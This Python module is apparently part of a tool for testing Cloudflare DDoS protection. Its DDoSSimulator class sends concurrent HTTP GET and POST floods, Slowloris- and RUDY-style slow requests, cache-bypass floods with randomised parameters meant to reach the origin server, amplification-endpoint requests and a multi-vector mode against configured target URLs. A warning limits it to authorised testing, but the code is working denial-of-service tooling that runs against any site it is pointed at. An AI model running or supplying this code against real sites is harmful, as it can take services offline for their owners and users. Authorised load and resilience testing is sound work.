"""DDoS attack simulation module for testing Cloudflare DDoS protection."""

import asyncio
import random
import string
import time
from enum import Enum, auto
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, field
import logging

from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TaskProgressColumn
from rich.live import Live
from rich.console import Console
from rich.table import Table

from .http_engine import HTTPEngine, HTTPMethod, HTTPResponse
from .config import Config

logger = logging.getLogger(__name__)
console = Console()


class DDoSAttackType(Enum):
    """DDoS attack types categorized by layer."""
    
    UDP_FLOOD = 1
    ICMP_FLOOD = 2
    DNS_AMPLIFICATION = 3
    NTP_AMPLIFICATION = 4
    
    SYN_FLOOD = 5
    SYN_ACK_FLOOD = 6
    ACK_FLOOD = 7
    RST_FLOOD = 8
    FRAGMENTATION = 9
    
    HTTP_GET_FLOOD = 10
    HTTP_POST_FLOOD = 11
    SLOWLORIS = 12
    RUDY = 13
    CACHE_BYPASS = 14
    
    MULTI_VECTOR = 15


@dataclass
class DDoSTestResult:
    """Result of a DDoS test."""
    attack_type: DDoSAttackType
    target: str
    total_requests: int
    successful_requests: int
    blocked_requests: int
    challenged_requests: int
    error_requests: int
    avg_response_time: float
    min_response_time: float
    max_response_time: float
    requests_per_second: float
    duration: float
    cf_protection_triggered: bool
    cf_ray_ids: List[str] = field(default_factory=list)
    status_code_distribution: Dict[int, int] = field(default_factory=dict)
    notes: List[str] = field(default_factory=list)


class DDoSSimulator:
    """
    DDoS attack simulator for testing Cloudflare DDoS protection.
    
    WARNING: Only use against systems you own or have explicit permission to test.
    """
    
    def __init__(self, http_engine: HTTPEngine, config: Config):
        self.http_engine = http_engine
        self.config = config
        self.results: List[DDoSTestResult] = []
        self.progress: Optional[Progress] = None
        self.current_task = None
        self.completed_requests = 0
        self.blocked_count = 0
        self.success_count = 0
    
    async def run(self) -> List[DDoSTestResult]:
        """Run the configured DDoS tests."""
        attack_type = DDoSAttackType(self.config.ddos_attack_type)
        
        for target in self.config.get_target_urls():
            console.print(f"\n[bold cyan]Target:[/] {target}")
            console.print(f"[bold cyan]Attack Type:[/] {attack_type.name}")
            console.print(f"[bold cyan]Total Requests:[/] {self.config.request_count}")
            console.print(f"[bold cyan]Concurrency:[/] {self.config.concurrency}\n")
            
            result = await self._run_attack(attack_type, target)
            self.results.append(result)
        
        await self.http_engine.close()
        return self.results
    
    async def _run_attack(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """Run a specific attack type against a target."""
        
        attack_handlers = {
            DDoSAttackType.UDP_FLOOD: self._simulate_volumetric_flood,
            DDoSAttackType.ICMP_FLOOD: self._simulate_volumetric_flood,
            DDoSAttackType.DNS_AMPLIFICATION: self._simulate_amplification,
            DDoSAttackType.NTP_AMPLIFICATION: self._simulate_amplification,
            DDoSAttackType.SYN_FLOOD: self._simulate_protocol_flood,
            DDoSAttackType.SYN_ACK_FLOOD: self._simulate_protocol_flood,
            DDoSAttackType.ACK_FLOOD: self._simulate_protocol_flood,
            DDoSAttackType.RST_FLOOD: self._simulate_protocol_flood,
            DDoSAttackType.FRAGMENTATION: self._simulate_fragmentation,
            DDoSAttackType.HTTP_GET_FLOOD: self._http_get_flood,
            DDoSAttackType.HTTP_POST_FLOOD: self._http_post_flood,
            DDoSAttackType.SLOWLORIS: self._slowloris_attack,
            DDoSAttackType.RUDY: self._rudy_attack,
            DDoSAttackType.CACHE_BYPASS: self._cache_bypass_flood,
            DDoSAttackType.MULTI_VECTOR: self._multi_vector_attack,
        }
        
        handler = attack_handlers.get(attack_type, self._http_get_flood)
        return await handler(attack_type, target)
    
    async def _http_get_flood(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """HTTP GET flood attack simulation."""
        responses: List[HTTPResponse] = []
        start_time = time.time()
        self.completed_requests = 0
        self.blocked_count = 0
        self.success_count = 0
        
        semaphore = asyncio.Semaphore(self.config.concurrency)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TaskProgressColumn(),
            TextColumn("|"),
            TextColumn("[green]OK:{task.fields[success]}"),
            TextColumn("[red]Blocked:{task.fields[blocked]}"),
            TextColumn("|"),
            TimeElapsedColumn(),
            console=console,
            refresh_per_second=10
        ) as progress:
            task = progress.add_task(
                "HTTP GET Flood",
                total=self.config.request_count,
                success=0,
                blocked=0
            )
            
            async def make_request(i: int):
                async with semaphore:
                    params = {
                        "_": str(int(time.time() * 1000)),
                        "r": str(random.randint(1, 1000000))
                    }
                    
                    response = await self.http_engine.request(
                        target,
                        HTTPMethod.GET,
                        params=params,
                        timeout=self.config.timeout
                    )
                    responses.append(response)
                    
                    if response.blocked:
                        self.blocked_count += 1
                    elif response.status_code in range(200, 400):
                        self.success_count += 1
                    
                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
            
            tasks = [make_request(i) for i in range(self.config.request_count)]
            await asyncio.gather(*tasks)
        
        duration = time.time() - start_time
        return self._compile_results(attack_type, target, responses, duration)
    
    async def _http_post_flood(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """HTTP POST flood attack simulation."""
        responses: List[HTTPResponse] = []
        start_time = time.time()
        self.completed_requests = 0
        self.blocked_count = 0
        self.success_count = 0
        
        semaphore = asyncio.Semaphore(self.config.concurrency)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TaskProgressColumn(),
            TextColumn("|"),
            TextColumn("[green]OK:{task.fields[success]}"),
            TextColumn("[red]Blocked:{task.fields[blocked]}"),
            TextColumn("|"),
            TimeElapsedColumn(),
            console=console,
            refresh_per_second=10
        ) as progress:
            task = progress.add_task(
                "HTTP POST Flood",
                total=self.config.request_count,
                success=0,
                blocked=0
            )
            
            async def make_request(i: int):
                async with semaphore:
                    data = {
                        "data": ''.join(random.choices(string.ascii_letters, k=random.randint(100, 1000))),
                        "timestamp": str(time.time()),
                        "id": str(random.randint(1, 1000000))
                    }
                    
                    response = await self.http_engine.request(
                        target,
                        HTTPMethod.POST,
                        data=data,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=self.config.timeout
                    )
                    responses.append(response)
                    
                    if response.blocked:
                        self.blocked_count += 1
                    elif response.status_code in range(200, 400):
                        self.success_count += 1
                    
                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
            
            tasks = [make_request(i) for i in range(self.config.request_count)]
            await asyncio.gather(*tasks)
        
        duration = time.time() - start_time
        return self._compile_results(attack_type, target, responses, duration)
    
    async def _slowloris_attack(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """
        Slowloris attack simulation.
        Sends partial HTTP headers slowly to keep connections open.
        """
        responses: List[HTTPResponse] = []
        start_time = time.time()
        self.blocked_count = 0
        self.success_count = 0
        request_count = min(self.config.request_count, 100)
        
        semaphore = asyncio.Semaphore(self.config.concurrency)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TaskProgressColumn(),
            TextColumn("|"),
            TextColumn("[green]OK:{task.fields[success]}"),
            TextColumn("[red]Blocked:{task.fields[blocked]}"),
            TextColumn("|"),
            TimeElapsedColumn(),
            console=console,
            refresh_per_second=10
        ) as progress:
            task = progress.add_task(
                "Slowloris Attack",
                total=request_count,
                success=0,
                blocked=0
            )
            
            async def slow_request(i: int):
                async with semaphore:
                    headers = {
                        "X-a": "b",
                        f"X-Custom-{i}": ''.join(random.choices(string.ascii_letters, k=50)),
                    }
                    
                    for j in range(5):
                        headers[f"X-Slow-{j}"] = ''.join(random.choices(string.ascii_letters, k=100))
                    
                    response = await self.http_engine.request(
                        target,
                        HTTPMethod.GET,
                        headers=headers,
                        timeout=self.config.timeout
                    )
                    
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                    responses.append(response)
                    
                    if response.blocked:
                        self.blocked_count += 1
                    elif response.status_code in range(200, 400):
                        self.success_count += 1
                    
                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
            
            tasks = [slow_request(i) for i in range(request_count)]
            await asyncio.gather(*tasks)
        
        duration = time.time() - start_time
        result = self._compile_results(attack_type, target, responses, duration)
        result.notes.append("Slowloris simulation - actual attack would hold connections longer")
        return result
    
    async def _rudy_attack(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """
        R-U-Dead-Yet (RUDY) attack simulation.
        Sends HTTP POST with very long content-length but sends data very slowly.
        """
        responses: List[HTTPResponse] = []
        start_time = time.time()
        self.blocked_count = 0
        self.success_count = 0
        request_count = min(self.config.request_count, 50)
        
        semaphore = asyncio.Semaphore(self.config.concurrency)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TaskProgressColumn(),
            TextColumn("|"),
            TextColumn("[green]OK:{task.fields[success]}"),
            TextColumn("[red]Blocked:{task.fields[blocked]}"),
            TextColumn("|"),
            TimeElapsedColumn(),
            console=console,
            refresh_per_second=10
        ) as progress:
            task = progress.add_task(
                "RUDY Attack",
                total=request_count,
                success=0,
                blocked=0
            )
            
            async def rudy_request(i: int):
                async with semaphore:
                    headers = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Content-Length": str(random.randint(10000, 100000)),
                    }
                    
                    small_data = ''.join(random.choices(string.ascii_letters, k=10))
                    
                    response = await self.http_engine.request(
                        target,
                        HTTPMethod.POST,
                        headers=headers,
                        data=small_data,
                        timeout=self.config.timeout
                    )
                    
                    await asyncio.sleep(random.uniform(1.0, 3.0))
                    responses.append(response)
                    
                    if response.blocked:
                        self.blocked_count += 1
                    elif response.status_code in range(200, 400):
                        self.success_count += 1
                    
                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
            
            tasks = [rudy_request(i) for i in range(request_count)]
            await asyncio.gather(*tasks)
        
        duration = time.time() - start_time
        result = self._compile_results(attack_type, target, responses, duration)
        result.notes.append("RUDY simulation - actual attack would trickle data more slowly")
        return result
    
    async def _cache_bypass_flood(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """
        Cache bypass flood attack.
        Generates unique requests to bypass CDN caching and hit origin.
        """
        responses: List[HTTPResponse] = []
        start_time = time.time()
        self.blocked_count = 0
        self.success_count = 0
        
        semaphore = asyncio.Semaphore(self.config.concurrency)
        
        paths = [
            "/",
            "/api/",
            "/search",
            "/products",
            "/users",
            "/data",
        ]
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TaskProgressColumn(),
            TextColumn("|"),
            TextColumn("[green]OK:{task.fields[success]}"),
            TextColumn("[red]Blocked:{task.fields[blocked]}"),
            TextColumn("|"),
            TimeElapsedColumn(),
            console=console,
            refresh_per_second=10
        ) as progress:
            task = progress.add_task(
                "Cache Bypass Flood",
                total=self.config.request_count,
                success=0,
                blocked=0
            )
            
            async def cache_bypass_request(i: int):
                async with semaphore:
                    path = random.choice(paths)
                    params = {
                        "_": str(int(time.time() * 1000000)),
                        "cb": ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
                        "nocache": "true",
                        "rand": str(random.randint(1, 10000000)),
                        "q": ''.join(random.choices(string.ascii_letters, k=random.randint(5, 20))),
                    }
                    
                    headers = {
                        "Cache-Control": "no-cache, no-store, must-revalidate",
                        "Pragma": "no-cache",
                    }
                    
                    url = target.rstrip("/") + path
                    
                    response = await self.http_engine.request(
                        url,
                        HTTPMethod.GET,
                        headers=headers,
                        params=params,
                        timeout=self.config.timeout
                    )
                    responses.append(response)
                    
                    if response.blocked:
                        self.blocked_count += 1
                    elif response.status_code in range(200, 400):
                        self.success_count += 1
                    
                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
            
            tasks = [cache_bypass_request(i) for i in range(self.config.request_count)]
            await asyncio.gather(*tasks)
        
        duration = time.time() - start_time
        result = self._compile_results(attack_type, target, responses, duration)
        
        cache_hits = sum(1 for r in responses if r.cf_cache_status == "HIT")
        cache_misses = sum(1 for r in responses if r.cf_cache_status in ["MISS", "DYNAMIC", "BYPASS"])
        result.notes.append(f"Cache hits: {cache_hits}, Cache misses: {cache_misses}")
        
        return result
    
    async def _simulate_volumetric_flood(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """
        Simulate volumetric attack at application layer.
        Note: Actual UDP/ICMP floods require raw sockets and are network-layer attacks.
        This simulates the effect by generating high-volume HTTP traffic.
        """
        responses: List[HTTPResponse] = []
        start_time = time.time()
        self.blocked_count = 0
        self.success_count = 0
        
        semaphore = asyncio.Semaphore(self.config.concurrency * 2)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TaskProgressColumn(),
            TextColumn("|"),
            TextColumn("[green]OK:{task.fields[success]}"),
            TextColumn("[red]Blocked:{task.fields[blocked]}"),
            TextColumn("|"),
            TimeElapsedColumn(),
            console=console,
            refresh_per_second=10
        ) as progress:
            task = progress.add_task(
                f"Volumetric ({attack_type.name})",
                total=self.config.request_count,
                success=0,
                blocked=0
            )
            
            async def volumetric_request(i: int):
                async with semaphore:
                    large_param = ''.join(random.choices(string.ascii_letters, k=random.randint(500, 2000)))
                    params = {
                        "data": large_param,
                        "id": str(i),
                    }
                    
                    response = await self.http_engine.request(
                        target,
                        HTTPMethod.GET,
                        params=params,
                        timeout=self.config.timeout
                    )
                    responses.append(response)
                    
                    if response.blocked:
                        self.blocked_count += 1
                    elif response.status_code in range(200, 400):
                        self.success_count += 1
                    
                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
            
            tasks = [volumetric_request(i) for i in range(self.config.request_count)]
            await asyncio.gather(*tasks)
        
        duration = time.time() - start_time
        result = self._compile_results(attack_type, target, responses, duration)
        result.notes.append(f"Application-layer simulation of {attack_type.name}")
        result.notes.append("Actual attack would use raw sockets at network layer")
        return result
    
    async def _simulate_amplification(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """
        Simulate amplification attack pattern at application layer.
        Tests endpoints that might return large responses to small requests.
        """
        responses: List[HTTPResponse] = []
        start_time = time.time()
        self.blocked_count = 0
        self.success_count = 0
        
        semaphore = asyncio.Semaphore(self.config.concurrency)
        
        amplification_endpoints = [
            "/api/export",
            "/api/dump",
            "/sitemap.xml",
            "/robots.txt",
            "/.well-known/",
            "/feed",
            "/rss",
            "/api/list",
        ]
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TaskProgressColumn(),
            TextColumn("|"),
            TextColumn("[green]OK:{task.fields[success]}"),
            TextColumn("[red]Blocked:{task.fields[blocked]}"),
            TextColumn("|"),
            TimeElapsedColumn(),
            console=console,
            refresh_per_second=10
        ) as progress:
            task = progress.add_task(
                f"Amplification ({attack_type.name})",
                total=self.config.request_count,
                success=0,
                blocked=0
            )
            
            async def amplification_request(i: int):
                async with semaphore:
                    endpoint = random.choice(amplification_endpoints)
                    url = target.rstrip("/") + endpoint
                    
                    params = {
                        "limit": "10000",
                        "all": "true",
                        "export": "true",
                    }
                    
                    response = await self.http_engine.request(
                        url,
                        HTTPMethod.GET,
                        params=params,
                        timeout=self.config.timeout
                    )
                    responses.append(response)
                    
                    if response.blocked:
                        self.blocked_count += 1
                    elif response.status_code in range(200, 400):
                        self.success_count += 1
                    
                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
            
            tasks = [amplification_request(i) for i in range(self.config.request_count)]
            await asyncio.gather(*tasks)
        
        duration = time.time() - start_time
        result = self._compile_results(attack_type, target, responses, duration)
        result.notes.append(f"Application-layer simulation of {attack_type.name}")
        return result
    
    async def _simulate_protocol_flood(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """
        Simulate protocol-level attacks at application layer.
        Note: Actual SYN/ACK floods require raw sockets.
        """
        responses: List[HTTPResponse] = []
        start_time = time.time()
        self.blocked_count = 0
        self.success_count = 0
        
        semaphore = asyncio.Semaphore(self.config.concurrency * 2)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TaskProgressColumn(),
            TextColumn("|"),
            TextColumn("[green]OK:{task.fields[success]}"),
            TextColumn("[red]Blocked:{task.fields[blocked]}"),
            TextColumn("|"),
            TimeElapsedColumn(),
            console=console,
            refresh_per_second=10
        ) as progress:
            task = progress.add_task(
                f"Protocol ({attack_type.name})",
                total=self.config.request_count,
                success=0,
                blocked=0
            )
            
            async def protocol_request(i: int):
                async with semaphore:
                    response = await self.http_engine.request(
                        target,
                        HTTPMethod.HEAD,
                        timeout=5
                    )
                    responses.append(response)
                    
                    if response.blocked:
                        self.blocked_count += 1
                    elif response.status_code in range(200, 400):
                        self.success_count += 1
                    
                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
            
            tasks = [protocol_request(i) for i in range(self.config.request_count)]
            await asyncio.gather(*tasks)
        
        duration = time.time() - start_time
        result = self._compile_results(attack_type, target, responses, duration)
        result.notes.append(f"Application-layer simulation of {attack_type.name}")
        result.notes.append("Actual attack would use raw sockets at transport layer")
        return result
    
    async def _simulate_fragmentation(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """
        Simulate fragmentation attack at application layer.
        Sends requests with chunked or unusual content patterns.
        """
        responses: List[HTTPResponse] = []
        start_time = time.time()
        self.blocked_count = 0
        self.success_count = 0
        
        semaphore = asyncio.Semaphore(self.config.concurrency)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TaskProgressColumn(),
            TextColumn("|"),
            TextColumn("[green]OK:{task.fields[success]}"),
            TextColumn("[red]Blocked:{task.fields[blocked]}"),
            TextColumn("|"),
            TimeElapsedColumn(),
            console=console,
            refresh_per_second=10
        ) as progress:
            task = progress.add_task(
                "Fragmentation Attack",
                total=self.config.request_count,
                success=0,
                blocked=0
            )
            
            async def fragmented_request(i: int):
                async with semaphore:
                    fragments = []
                    for _ in range(random.randint(5, 20)):
                        fragment = ''.join(random.choices(string.ascii_letters, k=random.randint(10, 100)))
                        fragments.append(fragment)
                    
                    headers = {
                        "Transfer-Encoding": "chunked",
                    }
                    
                    data = "\r\n".join(fragments)
                    
                    response = await self.http_engine.request(
                        target,
                        HTTPMethod.POST,
                        headers=headers,
                        data=data,
                        timeout=self.config.timeout
                    )
                    responses.append(response)
                    
                    if response.blocked:
                        self.blocked_count += 1
                    elif response.status_code in range(200, 400):
                        self.success_count += 1
                    
                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
            
            tasks = [fragmented_request(i) for i in range(self.config.request_count)]
            await asyncio.gather(*tasks)
        
        duration = time.time() - start_time
        result = self._compile_results(attack_type, target, responses, duration)
        result.notes.append("Application-layer fragmentation simulation")
        return result
    
    async def _multi_vector_attack(self, attack_type: DDoSAttackType, target: str) -> DDoSTestResult:
        """
        Multi-vector attack combining multiple attack types.
        """
        all_responses: List[HTTPResponse] = []
        start_time = time.time()
        
        console.print("[bold yellow]Running Multi-Vector Attack (3 phases)...[/]\n")
        
        attack_methods = [
            (self._http_get_flood, DDoSAttackType.HTTP_GET_FLOOD),
            (self._http_post_flood, DDoSAttackType.HTTP_POST_FLOOD),
            (self._cache_bypass_flood, DDoSAttackType.CACHE_BYPASS),
        ]
        
        original_count = self.config.request_count
        self.config.request_count = original_count // len(attack_methods)
        
        results = []
        for i, (method, atk_type) in enumerate(attack_methods, 1):
            console.print(f"[bold cyan]Phase {i}/{len(attack_methods)}:[/] {atk_type.name}")
            result = await method(atk_type, target)
            results.append(result)
        
        self.config.request_count = original_count
        
        duration = time.time() - start_time
        
        combined_result = DDoSTestResult(
            attack_type=DDoSAttackType.MULTI_VECTOR,
            target=target,
            total_requests=sum(r.total_requests for r in results),
            successful_requests=sum(r.successful_requests for r in results),
            blocked_requests=sum(r.blocked_requests for r in results),
            challenged_requests=sum(r.challenged_requests for r in results),
            error_requests=sum(r.error_requests for r in results),
            avg_response_time=sum(r.avg_response_time for r in results) / len(results),
            min_response_time=min(r.min_response_time for r in results),
            max_response_time=max(r.max_response_time for r in results),
            requests_per_second=sum(r.total_requests for r in results) / duration,
            duration=duration,
            cf_protection_triggered=any(r.cf_protection_triggered for r in results),
            notes=[f"Combined {len(attack_methods)} attack vectors"]
        )
        
        for r in results:
            for code, count in r.status_code_distribution.items():
                combined_result.status_code_distribution[code] = \
                    combined_result.status_code_distribution.get(code, 0) + count
        
        return combined_result
    
    def _compile_results(
        self,
        attack_type: DDoSAttackType,
        target: str,
        responses: List[HTTPResponse],
        duration: float
    ) -> DDoSTestResult:
        """Compile test results from responses."""
        
        successful = [r for r in responses if r.status_code in range(200, 400) and not r.blocked]
        blocked = [r for r in responses if r.blocked]
        challenged = [r for r in responses if r.challenge_presented]
        errors = [r for r in responses if r.error or r.status_code == 0]
        
        response_times = [r.elapsed_time for r in responses if r.elapsed_time > 0]
        
        status_dist: Dict[int, int] = {}
        for r in responses:
            status_dist[r.status_code] = status_dist.get(r.status_code, 0) + 1
        
        cf_ray_ids = [r.cf_ray for r in responses if r.cf_ray]
        
        cf_triggered = len(blocked) > 0 or len(challenged) > 0 or \
                       status_dist.get(429, 0) > 0 or status_dist.get(503, 0) > 0
        
        return DDoSTestResult(
            attack_type=attack_type,
            target=target,
            total_requests=len(responses),
            successful_requests=len(successful),
            blocked_requests=len(blocked),
            challenged_requests=len(challenged),
            error_requests=len(errors),
            avg_response_time=sum(response_times) / len(response_times) if response_times else 0,
            min_response_time=min(response_times) if response_times else 0,
            max_response_time=max(response_times) if response_times else 0,
            requests_per_second=len(responses) / duration if duration > 0 else 0,
            duration=duration,
            cf_protection_triggered=cf_triggered,
            cf_ray_ids=cf_ray_ids[:10],
            status_code_distribution=status_dist,
        )
